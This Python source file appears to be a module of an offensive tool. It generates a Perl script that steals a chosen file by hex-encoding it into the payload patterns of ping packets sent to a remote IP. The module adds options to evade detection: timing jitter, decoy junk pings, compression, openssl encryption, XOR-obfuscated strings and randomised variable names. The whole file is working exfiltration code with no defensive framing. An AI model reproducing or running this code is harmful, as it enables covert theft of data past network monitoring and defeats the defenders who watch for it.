import random

from ..obfuscation import xor_key, xor_encode


def _perl_payload(file_path, ip, period, random_delay, randomize=False, junk=0, randomize_junk=False, compress=False, encrypt=None, passphrase='', estimate=False, obfuscate_strings=False):
    perl_file = file_path.replace("\\", "\\\\").replace("'", "\\'")

    template = """use Digest::SHA qw(sha256_hex);
$|=1;
my $F='__FILE__';my $IP='__IP__';my $P=__PERIOD__;my $RD=__RDELAY__;
my $C=12;my $IB=3;my $R=5;my $T=2;
open(my $fh,'<:raw',$F) or die "[-] Cannot open $F: $!\\n";
my $data=do{local $/;<$fh>};close $fh;
my $hsh=sha256_hex($data);
my $hex=unpack('H*',$data);
my $dsz=length($data);
my $tot=int(($dsz+$C-1)/$C);
die "[-] File too large\\n" if $tot>2**(8*$IB);
if($RD!=0){print "[+] Sending '$F' ($dsz bytes) to '$IP' in $tot pings every ($P +- $RD) s\\n"}
elsif($P!=0){print "[+] Sending '$F' ($dsz bytes) to '$IP' in $tot pings every $P s\\n"}
else{print "[+] Sending '$F' ($dsz bytes) to '$IP' in $tot pings\\n"}
warn "[!] WARNING: random-delay ($RD s) > period ($P s)\\n" if $RD>$P;
my $ls=0;my $t0=time();
for my $i(0..$tot-1){
my $idx=sprintf('%06x',$i);
my $chunk=substr($hex,$i*24,24);
my $pat=$idx.$chunk;
my $ok=0;
for my $a(0..$R-1){
if($ls){
if($RD!=0){my $sl=$P+(rand(2)-1)*$RD;$sl=0 if $sl<0;select(undef,undef,undef,$sl)}
elsif($P!=0){select(undef,undef,undef,$P)}
}
$ls=1;
my $sz=int(length($pat)/2);
if(system("ping -c 1 -W $T -s $sz -p '$pat' '$IP' >/dev/null 2>&1")==0){$ok=1;last}
}
die "[-] No reply for ping $i, transfer aborted\\n" unless $ok;
my $s=$i+1;
if($P!=0||$RD!=0){
my $el=time()-$t0;
my $eh=int($el/3600);my $em=int(($el%3600)/60);my $es=int($el%60);
my $by=$s*$C;$by=$dsz if $by>$dsz;
my $pct=int(100*$s/$tot);
printf("\\r  %d/%d pings, %d/%d bytes, %d%%, elapsed %02d:%02d:%02d",$s,$tot,$by,$dsz,$pct,$eh,$em,$es);
if($RD==0&&$s>0){
my $rm=int($el*($tot-$s)/$s);my $rh=int($rm/3600);my $rmm=int(($rm%3600)/60);my $rss=$rm%60;
printf(", remaining ~%02d:%02d:%02d",$rh,$rmm,$rss)}
}elsif($s%100==0){print "  $s/$tot\\n"}
}
print "\\n";
print "=" x 50 . "\\n";
print " " x 21 . "DONE\\n";
print "=" x 50 . "\\n\\n";
print "[*] SHA-256: $hsh\\n";
"""

    script = template
    _xor_key = None
    if obfuscate_strings:
        _xor_key = xor_key()
        key_str = ','.join(str(b) for b in _xor_key)
        decode_block = (
            "my $_k=[" + key_str + "];\n"
            "my $_d=sub{my $h=shift;my $r='';for(my $i=0;$i<length($h);$i+=2){$r.=chr(hex(substr($h,$i,2))^$_k->[($i/2)%scalar(@$_k)])}$r};\n"
        )
        script = script.replace(
            "my $F='__FILE__';my $IP='__IP__';",
            decode_block + "my $F=$_d->('__XFILE__');my $IP=$_d->('__XIP__');"
        )
    if compress:
        script = script.replace(
            "use Digest::SHA qw(sha256_hex);\n",
            "use Digest::SHA qw(sha256_hex);\nuse IO::Compress::Gzip qw(gzip $GzipError);\n"
        )
        script = script.replace(
            "my $hex=unpack('H*',$data);\n",
            "my $osz=length($data);\n"
            "my $cd;gzip(\\$data,\\$cd) or die \"gzip: $GzipError\\n\";\n"
            "$data=$cd;\n"
            "my $csz=length($data);\n"
            "printf \"[*] Compressed: %d -> %d bytes (%.1f%%)\\n\",$osz,$csz,100*$csz/$osz;\n"
            "my $hex=unpack('H*',$data);\n"
        )
    if encrypt:
        perl_pass = passphrase.replace("\\", "\\\\").replace("'", "\\'")
        script = script.replace(
            "use Digest::SHA qw(sha256_hex);\n",
            "use Digest::SHA qw(sha256_hex);\nuse IPC::Open2;\n"
        )
        if obfuscate_strings:
            pp_line = "my $pp=$_d->('__XPP__');\n"
        else:
            pp_line = "my $pp='__PP_VALUE__';\n"
        encrypt_code = (
            pp_line +
            "my $ep=open2(my $erd,my $ewr,'openssl','enc','-" + encrypt + "','-pbkdf2','-iter','10000','-md','sha256','-pass',\"pass:$pp\");\n"
            "binmode $ewr;binmode $erd;print $ewr $data;close $ewr;\n"
            "{local $/;$data=<$erd>}close $erd;waitpid($ep,0);\n"
            "print \"[*] Encrypted with " + encrypt + "\\n\";\n"
        )
        script = script.replace(
            "my $hex=unpack('H*',$data);\n",
            encrypt_code + "my $hex=unpack('H*',$data);\n"
        )
    if junk > 0:
        script = script.replace(
            'my $C=12;my $IB=3;my $R=5;my $T=2;',
            f'my $C=12;my $IB=3;my $R=5;my $T=2;my $J={junk};'
        )
        if randomize_junk:
            junk_data = (
                "open(my $ur,'<:raw','/dev/urandom') or next;\n"
                "read($ur,my $rb,14);close $ur;\n"
                "my $jd='ff'.unpack('H*',$rb);\n"
            )
        else:
            junk_data = (
                "open(my $ur,'<:raw','/dev/urandom') or next;\n"
                "read($ur,my $rb,12);close $ur;\n"
                "my $jd='ffffff'.unpack('H*',$rb);\n"
            )
        junk_code = (
            "for my $j(0..$J-1){\n" +
            junk_data +
            "if($ls){\n"
            "if($RD!=0){my $sl=$P+(rand(2)-1)*$RD;$sl=0 if $sl<0;select(undef,undef,undef,$sl)}\n"
            "elsif($P!=0){select(undef,undef,undef,$P)}\n"
            "}\n"
            "$ls=1;\n"
            "system(\"ping -c 1 -W $T -s 15 -p '$jd' '$IP' >/dev/null 2>&1\");\n"
            "}\n"
        )
        script = script.replace("my $s=$i+1;\n", "my $s=$i+1;\n" + junk_code)
    if estimate:
        est_lines = (
            "print \"[!] ESTIMATE OPTION ENABLED — the file will NOT be transferred\\n\";\n"
            "print \"[*] File size (after processing): $dsz bytes\\n\";\n"
            "print \"[*] Data pings: $tot\\n\";\n"
        )
        if junk > 0:
            est_lines += (
                "print \"[*] Junk pings: \" . ($tot*$J) . \"\\n\";\n"
                "print \"[*] Total pings: \" . ($tot*(1+$J)) . \"\\n\";\n"
            )
            total_expr = "($tot*(1+$J))"
        else:
            est_lines += "print \"[*] Total pings: $tot\\n\";\n"
            total_expr = "$tot"
        est_lines += (
            "if($P!=0){\n"
            "my $et=" + total_expr + "*$P;my $h=int($et/3600);my $m=int(($et%3600)/60);my $ss=int($et)%60;\n"
            "printf \"[*] Estimated time: ~%02d:%02d:%02d\\n\",$h,$m,$ss;\n"
            "}\n"
            "print \"[*] SHA-256: $hsh\\n\";\n"
            "exit 0;\n"
        )
        script = script.replace("my $ls=0;my $t0=time();\n", est_lines)

    if randomize:
        import re
        var_names = [
            'F', 'IP', 'P', 'RD',
            'C', 'IB', 'R', 'T',
            'fh', 'data', 'hsh', 'hex', 'dsz', 'tot',
            'ls', 't0', 'i', 'idx', 'chunk', 'pat', 'ok',
            'a', 'sl', 'sz', 's',
            'el', 'eh', 'em', 'es', 'by', 'pct',
            'rm', 'rh', 'rmm', 'rss',
        ]
        if compress:
            var_names.extend(['osz', 'csz', 'cd'])
        if encrypt:
            var_names.extend(['pp', 'ep', 'erd', 'ewr'])
        if junk > 0:
            var_names.extend(['J', 'j', 'ur', 'rb', 'jd'])
        if estimate:
            var_names.extend(['et', 'h', 'm', 'ss'])
        if obfuscate_strings:
            var_names.extend(['_k', '_d'])
        letters = 'abcdefghijklmnopqrstuvwxyz'
        alphanums = letters + '0123456789'
        perl_reserved = {'for', 'die', 'sub', 'use', 'our', 'int', 'chr', 'ord', 'hex', 'oct', 'map', 'say', 'ref', 'abs', 'log'}
        original_names = set(var_names)
        used = set()
        mapping = {}
        for name in var_names:
            while True:
                rand_name = random.choice(letters) + ''.join(random.choices(alphanums, k=2))
                if rand_name not in used and rand_name not in perl_reserved and rand_name not in original_names:
                    used.add(rand_name)
                    mapping[name] = rand_name
                    break
        for old_name in sorted(var_names, key=len, reverse=True):
            pattern = r'\$' + re.escape(old_name) + r'(?=\W|$)'
            script = re.sub(pattern, '$' + mapping[old_name], script)

    period_str = f"{period:g}"
    rdelay_str = f"{random_delay:g}"

    if obfuscate_strings:
        script = (script
                  .replace('__XFILE__', xor_encode(file_path, _xor_key))
                  .replace('__XIP__', xor_encode(ip, _xor_key))
                  .replace('__PERIOD__', period_str)
                  .replace('__RDELAY__', rdelay_str))
        if encrypt:
            script = script.replace('__XPP__', xor_encode(passphrase, _xor_key))
    else:
        script = (script
                  .replace('__FILE__', perl_file)
                  .replace('__IP__', ip)
                  .replace('__PERIOD__', period_str)
                  .replace('__RDELAY__', rdelay_str))
        if encrypt:
            script = script.replace('__PP_VALUE__', perl_pass)

    return script
